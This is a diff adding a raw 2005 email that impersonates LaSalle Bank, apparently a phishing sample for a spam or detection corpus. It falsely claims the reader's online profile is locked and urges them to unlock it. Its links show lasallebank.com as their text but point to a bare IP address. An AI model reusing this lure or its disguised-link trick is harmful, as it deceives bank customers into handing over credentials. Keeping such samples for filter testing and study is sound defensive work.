@@ -1,0 +1,87 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 102AE2A88C
+	for <user@example.com>; Mon, 12 Sep 2005 15:33:36 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id CFEDD621C9A; Mon, 12 Sep 2005 15:33:35 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id A26D6621C99
+	for <user@example.com>; Mon, 12 Sep 2005 15:33:33 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id PAA26825
+	for user@example.com; Mon, 12 Sep 2005 15:33:32 -0400
+Received: from 82.77.136.134 ([82.77.136.134])
+	by mail.example.com with SMTP id PAA26817
+	for <user@biocserver.cwru.edu>; Mon, 12 Sep 2005 15:33:31 -0400
+Received: from 214.168.206.28 by ; Mon, 12 Sep 2005 17:25:18 -0300
+Message-ID: <RSOVCJPCJAKOBWWGPVYJZY@msn.com>
+From: "LaSalle Bank" <service@lasallebank.com>
+Reply-To: "LaSalle Bank" <service@lasallebank.com>
+To: user@example.com
+Subject: Urgent Security Notification.
+Date: Mon, 12 Sep 2005 22:23:18 +0200
+X-Mailer: Internet Mail Service (5.5.2650.21)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--1954149084513376538"
+X-Priority: 1
+X-MSMail-Priority: High
+Content-Length: 1281
+Lines: 49
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 141
+
+----1954149084513376538
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<br>
+<br>Dear Customer:
+<br>
+<br>We've noticed that you experienced trouble logging into LaSalle Online=
+ 
+<br>on 26/05/2005.
+<br>
+<br>After three unsuccessful attempts to access your account, your LaSalle=
+
+<br>Online Profile has been locked. This has been done to secure your 
+<br>accounts
+<br>and to protect your private information. LaSalle Bank is committed to
+<br>making sure that your online transactions are secure.
+<br>
+<br>You may unlock your profile by going to:
+<br><a HREF=3Dhttp://204.213.201.13/lasalle/
+target=3D"_self">http://www.lasallebank.com/online_services/asp.html</a>
+<br>
+<br>If you're still having trouble, online support is available for you at=
+:
+<br>
+<br><a HREF=3Dhttp://204.213.201.13/lasalle/
+target=3D"_self">http://www.lasallebank.com/online_services/asp.html</a>
+<br>
+<br>If you should have any additional questions or concerns, please contac=
+t
+<br>Customer Service at:
+<br>custserv@lasalle.com
+<br>
+<br>Thank You for using LaSalle Online !
+<br>
+<br>LaSalle Online Reference Number: 284386
+<br>
+<br>=A92005 LaSalle Bank Corporation. All rights reserved. LaSalle Bank N.=
+A. Member FDIC. 
+<br>
+<head>
+<html>
+
+
+
+
+----1954149084513376538--
+
